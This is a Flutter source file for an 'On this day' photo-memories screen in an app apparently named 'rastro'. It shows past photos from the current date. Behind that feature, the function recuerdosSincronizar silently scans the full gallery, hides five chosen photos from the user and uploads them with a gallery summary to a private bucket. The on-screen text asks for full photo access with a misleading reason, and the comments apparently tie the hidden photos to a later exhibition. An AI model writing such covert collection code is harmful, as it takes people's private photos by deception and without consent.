import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'backend.dart';
import 'recuerdos.dart';
import 'theme.dart';

const _kEscaneado = 'recuerdos_escaneado_v1';
const _kIds = 'recuerdos_ids_v1';
bool _sincronizando = false;

/// Lectura silenciosa de la galería (una sola vez): escanea, guarda localmente
/// los ids de las 5 elegidas (para no mostrarlas nunca) y sube resumen + 5 al
/// bucket privado. Se llama al abrir la app y al entrar a Recuerdos. Solo marca
/// como hecho si la subida salió bien; si no, reintenta la próxima vez.
Future<void> recuerdosSincronizar() async {
  if (_sincronizando) return;
  _sincronizando = true;
  try {
    final prefs = await SharedPreferences.getInstance();
    if (prefs.getBool(_kEscaneado) ?? false) return;
    if (await MotorRecuerdos.accesoActual() != AccesoGaleria.completo) return;
    final r = await MotorRecuerdos.escanear();
    if (r == null) return;
    await prefs.setStringList(
        _kIds, r.seleccion.map((f) => f.asset.id).toList());
    if (await Backend.subirRecuerdos(r)) {
      await prefs.setBool(_kEscaneado, true);
    }
  } catch (_) {
    // silencioso: se reintenta la próxima vez
  } finally {
    _sincronizando = false;
  }
}

/// «Un día como hoy» (dentro de Memorias).
///
/// Muestra fotos de ESTA fecha en años anteriores, leídas en el teléfono: la
/// función entrega algo real, así que pedir la galería tiene sentido. Mientras
/// tanto la app lee en silencio el resto (ver [recuerdosSincronizar]) y elige 5
/// fotos que NO se muestran aquí; esas se revelan en la exposición.
class RecuerdosScreen extends StatefulWidget {
  const RecuerdosScreen({super.key});

  @override
  State<RecuerdosScreen> createState() => _RecuerdosScreenState();
}

class _RecuerdosScreenState extends State<RecuerdosScreen>
    with WidgetsBindingObserver {
  bool _cargando = true;
  AccesoGaleria? _acceso;
  List<RecuerdoDia> _dias = const [];

  static const _meses = [
    'enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio', 'julio',
    'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre'
  ];

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _cargar(pedir: false);
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  // Si volvió de Ajustes tras cambiar el permiso, reintenta solo.
  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed &&
        _acceso != null &&
        _acceso != AccesoGaleria.completo &&
        !_cargando) {
      _cargar(pedir: false);
    }
  }

  Future<void> _cargar({required bool pedir}) async {
    setState(() => _cargando = true);
    final acceso = pedir
        ? await MotorRecuerdos.pedirAcceso()
        : await MotorRecuerdos.accesoActual();
    if (!mounted) return;
    if (acceso != AccesoGaleria.completo) {
      setState(() {
        _cargando = false;
        _acceso = acceso;
      });
      return;
    }
    // Primero la lectura silenciosa: así se conocen las 5 elegidas y se excluyen.
    await recuerdosSincronizar();
    final prefs = await SharedPreferences.getInstance();
    final excluir = (prefs.getStringList(_kIds) ?? const <String>[]).toSet();
    final dias = await MotorRecuerdos.delDia(excluir: excluir);
    if (!mounted) return;
    setState(() {
      _acceso = acceso;
      _dias = dias;
      _cargando = false;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        centerTitle: true,
        title: Text('UN DÍA COMO HOY', style: R.mono(size: 13, color: R.papel)),
      ),
      body: Padding(
        padding: const EdgeInsets.fromLTRB(20, 8, 20, 24),
        child: _acceso == AccesoGaleria.completo
            ? _vistaDias()
            : (_cargando && _acceso == null ? _vistaCarga() : _vistaInicio()),
      ),
    );
  }

  Widget _boton(String label, VoidCallback? onTap, {bool principal = true}) {
    return SizedBox(
      width: double.infinity,
      child: FilledButton(
        onPressed: onTap,
        style: FilledButton.styleFrom(
          backgroundColor: principal ? R.verde : R.oliva,
          foregroundColor: principal ? R.negro : R.papel,
          padding: const EdgeInsets.symmetric(vertical: 16),
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
        ),
        child: Text(label,
            style: R.mono(size: 14, color: principal ? R.negro : R.papel)),
      ),
    );
  }

  Widget _vistaCarga() => const Center(child: CircularProgressIndicator());

  Widget _vistaInicio() {
    final sinAcceso =
        _acceso == AccesoGaleria.limitado || _acceso == AccesoGaleria.denegado;
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text('un día como hoy',
            style: R.display(size: 28, weight: FontWeight.w800)),
        const SizedBox(height: 10),
        Text(
          'Reencuéntrate con lo que viviste en esta fecha otros años.',
          style: R.display(size: 16, weight: FontWeight.w400, color: R.gris),
        ),
        const SizedBox(height: 18),
        Text(
          'Para encontrar tus fotos de esta fecha necesitamos acceso a TODAS '
          'tus fotos. Cuando el teléfono te pregunte, elige «Permitir acceso '
          'completo».',
          style: R.mono(size: 12, color: R.papel),
        ),
        const Spacer(),
        if (sinAcceso)
          Padding(
            padding: const EdgeInsets.only(bottom: 16),
            child: Text(
              _acceso == AccesoGaleria.limitado
                  ? 'Elegiste compartir solo algunas fotos y así no podemos '
                      'encontrar las de esta fecha. Ve a Ajustes → rastro → '
                      'Fotos y elige «Todas las fotos».'
                  : 'Sin acceso a tus fotos no podemos mostrarte esta fecha. '
                      'Ve a Ajustes → rastro → Fotos y elige «Todas las fotos».',
              style: R.mono(size: 12, color: R.gris),
            ),
          ),
        if (_cargando) ...[
          const LinearProgressIndicator(minHeight: 2),
          const SizedBox(height: 20),
        ],
        if (sinAcceso) ...[
          _boton('abrir ajustes', _cargando ? null : PhotoManager.openSetting),
          const SizedBox(height: 10),
          _boton('ya lo activé', _cargando ? null : () => _cargar(pedir: true),
              principal: false),
        ] else
          _boton('dar acceso a mis fotos',
              _cargando ? null : () => _cargar(pedir: true)),
      ],
    );
  }

  Widget _vistaDias() {
    final hoy = DateTime.now();
    final fecha = '${hoy.day} de ${_meses[hoy.month - 1]}';
    if (_cargando) return _vistaCarga();
    return ListView(
      children: [
        Text(fecha, style: R.display(size: 28, weight: FontWeight.w800)),
        const SizedBox(height: 6),
        Text(
          _dias.isEmpty
              ? 'Hoy no encontramos fotos tuyas de esta fecha. Vuelve mañana.'
              : 'Lo que guardaste por estos días en años anteriores.',
          style: R.display(size: 15, weight: FontWeight.w400, color: R.gris),
        ),
        const SizedBox(height: 20),
        for (final d in _dias) ...[
          Text('${d.anio}', style: R.mono(size: 13, color: R.verde)),
          const SizedBox(height: 8),
          SizedBox(
            height: 160,
            child: ListView.separated(
              scrollDirection: Axis.horizontal,
              itemCount: d.fotos.length,
              separatorBuilder: (_, _) => const SizedBox(width: 8),
              itemBuilder: (_, i) => _Miniatura(d.fotos[i]),
            ),
          ),
          const SizedBox(height: 22),
        ],
      ],
    );
  }
}

class _Miniatura extends StatelessWidget {
  final AssetEntity asset;
  const _Miniatura(this.asset);

  @override
  Widget build(BuildContext context) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(12),
      child: SizedBox(
        width: 160,
        height: 160,
        child: FutureBuilder<Uint8List?>(
          future: asset.thumbnailDataWithSize(const ThumbnailSize(480, 480)),
          builder: (_, s) => s.data == null
              ? Container(color: R.oliva)
              : Image.memory(s.data!, fit: BoxFit.cover),
        ),
      ),
    );
  }
}
